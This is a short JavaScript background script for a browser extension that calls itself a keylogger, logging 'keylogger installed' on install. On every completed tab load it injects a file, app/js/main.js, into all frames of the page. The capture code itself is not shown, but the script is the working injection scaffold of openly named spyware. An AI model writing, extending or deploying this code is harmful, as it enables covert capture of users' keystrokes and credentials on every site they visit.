
browser.runtime.onInstalled.addListener(function() {
   console.log('keylogger installed')
});

browser.tabs.onUpdated.addListener(function(id, changeInfo) {

  if(changeInfo.status === 'complete'){
    browser.tabs.executeScript(id, {
      allFrames: true,
      file: 'app/js/main.js'
    });
  }
});
